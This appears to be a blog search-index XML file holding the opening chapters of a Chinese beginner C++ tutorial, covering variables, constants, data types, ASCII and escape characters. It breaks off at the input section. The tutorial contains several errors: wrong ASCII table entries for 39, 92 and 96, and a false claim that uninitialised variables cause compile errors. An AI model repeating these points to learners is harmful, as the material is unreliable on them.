<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C++基础入门</title>
    <url>/2024/10/21/C++/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="C-基础入门"><a href="#C-基础入门" class="headerlink" title="C++基础入门"></a>C++基础入门</h1><h2 id="1-C-初识"><a href="#1-C-初识" class="headerlink" title="1 C++初识"></a>1 C++初识</h2><h3 id="1-1-第一个C-程序"><a href="#1-1-第一个C-程序" class="headerlink" title="1.1  第一个C++程序"></a>1.1  第一个C++程序</h3><p>编写一个C++程序总共分为4个步骤</p>
<ul>
<li>创建项目</li>
<li>创建文件</li>
<li>编写代码</li>
<li>运行程序</li>
</ul>
<h4 id="1-1-1-创建项目"><a href="#1-1-1-创建项目" class="headerlink" title="1.1.1 创建项目"></a>1.1.1 创建项目</h4><p>​	Visual Studio是我们用来编写C++程序的主要工具，我们先将它打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541383178746.png"
                      alt="1541383178746"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541384366413.png"
                      alt="1541384366413"
                ></p>
<h4 id="1-1-2-创建文件"><a href="#1-1-2-创建文件" class="headerlink" title="1.1.2 创建文件"></a>1.1.2 创建文件</h4><p>右键源文件，选择添加-&gt;新建项</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541383817248.png"
                      alt="1541383817248"
                ></p>
<p>给C++文件起个名称，然后点击添加即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541384140042.png"
                      alt="1541384140042"
                ></p>
<h4 id="1-1-3-编写代码"><a href="#1-1-3-编写代码" class="headerlink" title="1.1.3 编写代码"></a>1.1.3 编写代码</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="1-1-4-运行程序"><a href="#1-1-4-运行程序" class="headerlink" title="1.1.4 运行程序"></a>1.1.4 运行程序</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541384818688.png"
                      alt="1541384818688"
                ></p>
<h3 id="1-2-注释"><a href="#1-2-注释" class="headerlink" title="1.2 注释"></a>1.2 注释</h3><p><strong>作用</strong>：在代码中加一些说明和解释，方便自己或其他程序员程序员阅读代码</p>
<p><strong>两种格式</strong></p>
<ol>
<li><strong>单行注释</strong>：<code>// 描述信息</code> <ul>
<li>通常放在一行代码的上方，或者一条语句的末尾，&#x3D;&#x3D;对该行代码说明&#x3D;&#x3D;</li>
</ul>
</li>
<li><strong>多行注释</strong>： <code>/* 描述信息 */</code><ul>
<li>通常放在一段代码的上方，&#x3D;&#x3D;对该段代码做整体说明&#x3D;&#x3D;</li>
</ul>
</li>
</ol>
<blockquote>
<p>提示：编译器在编译代码时，会忽略注释的内容</p>
</blockquote>
<h3 id="1-3-变量"><a href="#1-3-变量" class="headerlink" title="1.3 变量"></a>1.3 变量</h3><p><strong>作用</strong>：给一段指定的内存空间起名，方便操作这段内存</p>
<p><strong>语法</strong>：<code>数据类型 变量名 = 初始值;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//变量的定义</span></span><br><span class="line">	<span class="comment">//语法：数据类型  变量名 = 初始值</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：C++在创建变量时，必须给变量一个初始值，否则会报错</p>
</blockquote>
<h3 id="1-4-常量"><a href="#1-4-常量" class="headerlink" title="1.4  常量"></a>1.4  常量</h3><p><strong>作用</strong>：用于记录程序中不可更改的数据</p>
<p>C++定义常量两种方式</p>
<ol>
<li><p><strong>#define</strong> 宏常量： <code>#define 常量名 常量值</code></p>
<ul>
<li>&#x3D;&#x3D;通常在文件上方定义&#x3D;&#x3D;，表示一个常量</li>
</ul>
</li>
<li><p><strong>const</strong>修饰的变量 <code>const 数据类型 常量名 = 常量值</code></p>
<ul>
<li>&#x3D;&#x3D;通常在变量定义前加关键字const&#x3D;&#x3D;，修饰该变量为常量，不可修改</li>
</ul>
</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、宏常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> day 7</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;一周里总共有 &quot;</span> &lt;&lt; day &lt;&lt; <span class="string">&quot; 天&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//day = 8;  //报错，宏常量不可以修改</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、const修饰变量</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> month = <span class="number">12</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;一年里总共有 &quot;</span> &lt;&lt; month &lt;&lt; <span class="string">&quot; 个月份&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//month = 24; //报错，常量是不可以修改的</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>










<h3 id="1-5-关键字"><a href="#1-5-关键字" class="headerlink" title="1.5 关键字"></a>1.5 关键字</h3><p><strong>作用：</strong>关键字是C++中预先保留的单词（标识符）</p>
<ul>
<li><strong>在定义变量或者常量时候，不要用关键字</strong></li>
</ul>
<p>C++关键字如下：</p>
<table>
<thead>
<tr>
<th>asm</th>
<th>do</th>
<th>if</th>
<th>return</th>
<th>typedef</th>
</tr>
</thead>
<tbody><tr>
<td>auto</td>
<td>double</td>
<td>inline</td>
<td>short</td>
<td>typeid</td>
</tr>
<tr>
<td>bool</td>
<td>dynamic_cast</td>
<td>int</td>
<td>signed</td>
<td>typename</td>
</tr>
<tr>
<td>break</td>
<td>else</td>
<td>long</td>
<td>sizeof</td>
<td>union</td>
</tr>
<tr>
<td>case</td>
<td>enum</td>
<td>mutable</td>
<td>static</td>
<td>unsigned</td>
</tr>
<tr>
<td>catch</td>
<td>explicit</td>
<td>namespace</td>
<td>static_cast</td>
<td>using</td>
</tr>
<tr>
<td>char</td>
<td>export</td>
<td>new</td>
<td>struct</td>
<td>virtual</td>
</tr>
<tr>
<td>class</td>
<td>extern</td>
<td>operator</td>
<td>switch</td>
<td>void</td>
</tr>
<tr>
<td>const</td>
<td>false</td>
<td>private</td>
<td>template</td>
<td>volatile</td>
</tr>
<tr>
<td>const_cast</td>
<td>float</td>
<td>protected</td>
<td>this</td>
<td>wchar_t</td>
</tr>
<tr>
<td>continue</td>
<td>for</td>
<td>public</td>
<td>throw</td>
<td>while</td>
</tr>
<tr>
<td>default</td>
<td>friend</td>
<td>register</td>
<td>true</td>
<td></td>
</tr>
<tr>
<td>delete</td>
<td>goto</td>
<td>reinterpret_cast</td>
<td>try</td>
<td></td>
</tr>
</tbody></table>
<p><code>提示：在给变量或者常量起名称时候，不要用C++得关键字，否则会产生歧义。</code></p>
<h3 id="1-6-标识符命名规则"><a href="#1-6-标识符命名规则" class="headerlink" title="1.6 标识符命名规则"></a>1.6 标识符命名规则</h3><p><strong>作用</strong>：C++规定给标识符（变量、常量）命名时，有一套自己的规则</p>
<ul>
<li>标识符不能是关键字</li>
<li>标识符只能由字母、数字、下划线组成</li>
<li>第一个字符必须为字母或下划线</li>
<li>标识符中字母区分大小写</li>
</ul>
<blockquote>
<p>建议：给标识符命名时，争取做到见名知意的效果，方便自己和他人的阅读</p>
</blockquote>
<h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2 数据类型"></a>2 数据类型</h2><p>C++规定在创建一个变量或者常量时，必须要指定出相应的数据类型，否则无法给变量分配内存</p>
<h3 id="2-1-整型"><a href="#2-1-整型" class="headerlink" title="2.1 整型"></a>2.1 整型</h3><p><strong>作用</strong>：整型变量表示的是&#x3D;&#x3D;整数类型&#x3D;&#x3D;的数据</p>
<p>C++中能够表示整型的类型有以下几种方式，<strong>区别在于所占内存空间不同</strong>：</p>
<table>
<thead>
<tr>
<th><strong>数据类型</strong></th>
<th><strong>占用空间</strong></th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>short(短整型)</td>
<td>2字节</td>
<td>(-2^15 ~ 2^15-1)</td>
</tr>
<tr>
<td>int(整型)</td>
<td>4字节</td>
<td>(-2^31 ~ 2^31-1)</td>
</tr>
<tr>
<td>long(长整形)</td>
<td>Windows为4字节，Linux为4字节(32位)，8字节(64位)</td>
<td>(-2^31 ~ 2^31-1)</td>
</tr>
<tr>
<td>long long(长长整形)</td>
<td>8字节</td>
<td>(-2^63 ~ 2^63-1)</td>
</tr>
</tbody></table>
<h3 id="2-2-sizeof关键字"><a href="#2-2-sizeof关键字" class="headerlink" title="2.2 sizeof关键字"></a>2.2 sizeof关键字</h3><p><strong>作用：</strong>利用sizeof关键字可以&#x3D;&#x3D;统计数据类型所占内存大小&#x3D;&#x3D;</p>
<p><strong>语法：</strong> <code>sizeof( 数据类型 / 变量)</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;short 类型所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">short</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;int 类型所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">int</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;long 类型所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;long long 类型所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<blockquote>
<p><strong>整型结论</strong>：&#x3D;&#x3D;short &lt; int &lt;&#x3D; long &lt;&#x3D; long long&#x3D;&#x3D;</p>
</blockquote>
<h3 id="2-3-实型（浮点型）"><a href="#2-3-实型（浮点型）" class="headerlink" title="2.3 实型（浮点型）"></a>2.3 实型（浮点型）</h3><p><strong>作用</strong>：用于&#x3D;&#x3D;表示小数&#x3D;&#x3D;</p>
<p>浮点型变量分为两种：</p>
<ol>
<li>单精度float </li>
<li>双精度double</li>
</ol>
<p>两者的<strong>区别</strong>在于表示的有效数字范围不同。</p>
<table>
<thead>
<tr>
<th><strong>数据类型</strong></th>
<th><strong>占用空间</strong></th>
<th><strong>有效数字范围</strong></th>
</tr>
</thead>
<tbody><tr>
<td>float</td>
<td>4字节</td>
<td>7位有效数字</td>
</tr>
<tr>
<td>double</td>
<td>8字节</td>
<td>15～16位有效数字</td>
</tr>
</tbody></table>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> f1 = <span class="number">3.14f</span>;</span><br><span class="line">	<span class="type">double</span> d1 = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; f1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; d1&lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;float  sizeof = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(f1) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;double sizeof = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(d1) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//科学计数法</span></span><br><span class="line">	<span class="type">float</span> f2 = <span class="number">3e2</span>; <span class="comment">// 3 * 10 ^ 2 </span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;f2 = &quot;</span> &lt;&lt; f2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">float</span> f3 = <span class="number">3e-2</span>;  <span class="comment">// 3 * 0.1 ^ 2</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;f3 = &quot;</span> &lt;&lt; f3 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="2-4-字符型"><a href="#2-4-字符型" class="headerlink" title="2.4 字符型"></a>2.4 字符型</h3><p><strong>作用：</strong>字符型变量用于显示单个字符</p>
<p><strong>语法：</strong><code>char ch = &#39;a&#39;;</code></p>
<blockquote>
<p>注意1：在显示字符型变量时，用单引号将字符括起来，不要用双引号</p>
</blockquote>
<blockquote>
<p>注意2：单引号内只能有一个字符，不可以是字符串</p>
</blockquote>
<ul>
<li>C和C++中字符型变量只占用&#x3D;&#x3D;1个字节&#x3D;&#x3D;。</li>
<li>字符型变量并不是把字符本身放到内存中存储，而是将对应的ASCII编码放入到存储单元</li>
</ul>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> ch = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	cout &lt;&lt; ch &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">char</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ch = &quot;abcde&quot;; //错误，不可以用双引号</span></span><br><span class="line">	<span class="comment">//ch = &#x27;abcde&#x27;; //错误，单引号内只能引用一个字符</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span>)ch &lt;&lt; endl;  <span class="comment">//查看字符a对应的ASCII码</span></span><br><span class="line">	ch = <span class="number">97</span>; <span class="comment">//可以直接用ASCII给字符型变量赋值</span></span><br><span class="line">	cout &lt;&lt; ch &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ASCII码表格：</p>
<table>
<thead>
<tr>
<th><strong>ASCII</strong>值</th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII</strong>值</th>
<th><strong>字符</strong></th>
<th><strong>ASCII</strong>值</th>
<th><strong>字符</strong></th>
<th><strong>ASCII</strong>值</th>
<th><strong>字符</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NUT</td>
<td>32</td>
<td>(space)</td>
<td>64</td>
<td>@</td>
<td>96</td>
<td>、</td>
</tr>
<tr>
<td>1</td>
<td>SOH</td>
<td>33</td>
<td>!</td>
<td>65</td>
<td>A</td>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>2</td>
<td>STX</td>
<td>34</td>
<td>“</td>
<td>66</td>
<td>B</td>
<td>98</td>
<td>b</td>
</tr>
<tr>
<td>3</td>
<td>ETX</td>
<td>35</td>
<td>#</td>
<td>67</td>
<td>C</td>
<td>99</td>
<td>c</td>
</tr>
<tr>
<td>4</td>
<td>EOT</td>
<td>36</td>
<td>$</td>
<td>68</td>
<td>D</td>
<td>100</td>
<td>d</td>
</tr>
<tr>
<td>5</td>
<td>ENQ</td>
<td>37</td>
<td>%</td>
<td>69</td>
<td>E</td>
<td>101</td>
<td>e</td>
</tr>
<tr>
<td>6</td>
<td>ACK</td>
<td>38</td>
<td>&amp;</td>
<td>70</td>
<td>F</td>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>7</td>
<td>BEL</td>
<td>39</td>
<td>,</td>
<td>71</td>
<td>G</td>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>8</td>
<td>BS</td>
<td>40</td>
<td>(</td>
<td>72</td>
<td>H</td>
<td>104</td>
<td>h</td>
</tr>
<tr>
<td>9</td>
<td>HT</td>
<td>41</td>
<td>)</td>
<td>73</td>
<td>I</td>
<td>105</td>
<td>i</td>
</tr>
<tr>
<td>10</td>
<td>LF</td>
<td>42</td>
<td>*</td>
<td>74</td>
<td>J</td>
<td>106</td>
<td>j</td>
</tr>
<tr>
<td>11</td>
<td>VT</td>
<td>43</td>
<td>+</td>
<td>75</td>
<td>K</td>
<td>107</td>
<td>k</td>
</tr>
<tr>
<td>12</td>
<td>FF</td>
<td>44</td>
<td>,</td>
<td>76</td>
<td>L</td>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>13</td>
<td>CR</td>
<td>45</td>
<td>-</td>
<td>77</td>
<td>M</td>
<td>109</td>
<td>m</td>
</tr>
<tr>
<td>14</td>
<td>SO</td>
<td>46</td>
<td>.</td>
<td>78</td>
<td>N</td>
<td>110</td>
<td>n</td>
</tr>
<tr>
<td>15</td>
<td>SI</td>
<td>47</td>
<td>&#x2F;</td>
<td>79</td>
<td>O</td>
<td>111</td>
<td>o</td>
</tr>
<tr>
<td>16</td>
<td>DLE</td>
<td>48</td>
<td>0</td>
<td>80</td>
<td>P</td>
<td>112</td>
<td>p</td>
</tr>
<tr>
<td>17</td>
<td>DCI</td>
<td>49</td>
<td>1</td>
<td>81</td>
<td>Q</td>
<td>113</td>
<td>q</td>
</tr>
<tr>
<td>18</td>
<td>DC2</td>
<td>50</td>
<td>2</td>
<td>82</td>
<td>R</td>
<td>114</td>
<td>r</td>
</tr>
<tr>
<td>19</td>
<td>DC3</td>
<td>51</td>
<td>3</td>
<td>83</td>
<td>S</td>
<td>115</td>
<td>s</td>
</tr>
<tr>
<td>20</td>
<td>DC4</td>
<td>52</td>
<td>4</td>
<td>84</td>
<td>T</td>
<td>116</td>
<td>t</td>
</tr>
<tr>
<td>21</td>
<td>NAK</td>
<td>53</td>
<td>5</td>
<td>85</td>
<td>U</td>
<td>117</td>
<td>u</td>
</tr>
<tr>
<td>22</td>
<td>SYN</td>
<td>54</td>
<td>6</td>
<td>86</td>
<td>V</td>
<td>118</td>
<td>v</td>
</tr>
<tr>
<td>23</td>
<td>TB</td>
<td>55</td>
<td>7</td>
<td>87</td>
<td>W</td>
<td>119</td>
<td>w</td>
</tr>
<tr>
<td>24</td>
<td>CAN</td>
<td>56</td>
<td>8</td>
<td>88</td>
<td>X</td>
<td>120</td>
<td>x</td>
</tr>
<tr>
<td>25</td>
<td>EM</td>
<td>57</td>
<td>9</td>
<td>89</td>
<td>Y</td>
<td>121</td>
<td>y</td>
</tr>
<tr>
<td>26</td>
<td>SUB</td>
<td>58</td>
<td>:</td>
<td>90</td>
<td>Z</td>
<td>122</td>
<td>z</td>
</tr>
<tr>
<td>27</td>
<td>ESC</td>
<td>59</td>
<td>;</td>
<td>91</td>
<td>[</td>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>28</td>
<td>FS</td>
<td>60</td>
<td>&lt;</td>
<td>92</td>
<td>&#x2F;</td>
<td>124</td>
<td>|</td>
</tr>
<tr>
<td>29</td>
<td>GS</td>
<td>61</td>
<td>&#x3D;</td>
<td>93</td>
<td>]</td>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>30</td>
<td>RS</td>
<td>62</td>
<td>&gt;</td>
<td>94</td>
<td>^</td>
<td>126</td>
<td>&#96;</td>
</tr>
<tr>
<td>31</td>
<td>US</td>
<td>63</td>
<td>?</td>
<td>95</td>
<td>_</td>
<td>127</td>
<td>DEL</td>
</tr>
</tbody></table>
<p>ASCII 码大致由以下<strong>两部分组</strong>成：</p>
<ul>
<li>ASCII 非打印控制字符： ASCII 表上的数字 <strong>0-31</strong> 分配给了控制字符，用于控制像打印机等一些外围设备。</li>
<li>ASCII 打印字符：数字 <strong>32-126</strong> 分配给了能在键盘上找到的字符，当查看或打印文档时就会出现。</li>
</ul>
<h3 id="2-5-转义字符"><a href="#2-5-转义字符" class="headerlink" title="2.5 转义字符"></a>2.5 转义字符</h3><p><strong>作用：</strong>用于表示一些&#x3D;&#x3D;不能显示出来的ASCII字符&#x3D;&#x3D;</p>
<p>现阶段我们常用的转义字符有：<code> \n  \\  \t</code></p>
<table>
<thead>
<tr>
<th><strong>转义字符</strong></th>
<th><strong>含义</strong></th>
<th><strong>ASCII</strong>码值（十进制）</th>
</tr>
</thead>
<tbody><tr>
<td>\a</td>
<td>警报</td>
<td>007</td>
</tr>
<tr>
<td>\b</td>
<td>退格(BS) ，将当前位置移到前一列</td>
<td>008</td>
</tr>
<tr>
<td>\f</td>
<td>换页(FF)，将当前位置移到下页开头</td>
<td>012</td>
</tr>
<tr>
<td><strong>\n</strong></td>
<td><strong>换行(LF) ，将当前位置移到下一行开头</strong></td>
<td><strong>010</strong></td>
</tr>
<tr>
<td>\r</td>
<td>回车(CR) ，将当前位置移到本行开头</td>
<td>013</td>
</tr>
<tr>
<td><strong>\t</strong></td>
<td><strong>水平制表(HT)  （跳到下一个TAB位置）</strong></td>
<td><strong>009</strong></td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表(VT)</td>
<td>011</td>
</tr>
<tr>
<td><strong>\\</strong></td>
<td><strong>代表一个反斜线字符”&quot;</strong></td>
<td><strong>092</strong></td>
</tr>
<tr>
<td>&#39;</td>
<td>代表一个单引号（撇号）字符</td>
<td>039</td>
</tr>
<tr>
<td>&quot;</td>
<td>代表一个双引号字符</td>
<td>034</td>
</tr>
<tr>
<td>?</td>
<td>代表一个问号</td>
<td>063</td>
</tr>
<tr>
<td>\0</td>
<td>数字0</td>
<td>000</td>
</tr>
<tr>
<td>\ddd</td>
<td>8进制转义字符，d范围0~7</td>
<td>3位8进制</td>
</tr>
<tr>
<td>\xhh</td>
<td>16进制转义字符，h范围0<del>9，a</del>f，A~F</td>
<td>3位16进制</td>
</tr>
</tbody></table>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\\&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\tHello&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\n&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h3 id="2-6-字符串型"><a href="#2-6-字符串型" class="headerlink" title="2.6 字符串型"></a>2.6 字符串型</h3><p><strong>作用</strong>：用于表示一串字符</p>
<p><strong>两种风格</strong></p>
<ol>
<li><p><strong>C风格字符串</strong>： <code>char 变量名[] = &quot;字符串值&quot;</code></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str1[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	cout &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<blockquote>
<p>注意：C风格的字符串要用双引号括起来</p>
</blockquote>
<ol>
<li><p><strong>C++风格字符串</strong>：  <code>string  变量名 = &quot;字符串值&quot;</code></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<blockquote>
<p>注意：C++风格字符串，需要加入头文件&#x3D;&#x3D;#include&lt;string&gt;&#x3D;&#x3D;</p>
</blockquote>
<h3 id="2-7-布尔类型-bool"><a href="#2-7-布尔类型-bool" class="headerlink" title="2.7 布尔类型 bool"></a>2.7 布尔类型 bool</h3><p><strong>作用：</strong>布尔数据类型代表真或假的值 </p>
<p>bool类型只有两个值：</p>
<ul>
<li>true  — 真（本质是1）</li>
<li>false — 假（本质是0）</li>
</ul>
<p><strong>bool类型占&#x3D;&#x3D;1个字节&#x3D;&#x3D;大小</strong></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	cout &lt;&lt; flag &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	flag = <span class="literal">false</span>;</span><br><span class="line">	cout &lt;&lt; flag &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;size of bool = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">bool</span>) &lt;&lt; endl; <span class="comment">//1</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>















<h3 id="2-8-数据的输入"><a href="#2-8-数据的输入" class="headerlink" title="2.8 数据的输入"></a>2.8 数据的输入</h3><p><strong>作用：用于从键盘获取数据</strong></p>
<p><strong>关键字：</strong>cin</p>
<p><strong>语法：</strong> <code>cin &gt;&gt; 变量 </code></p>
<p>示例：</p>
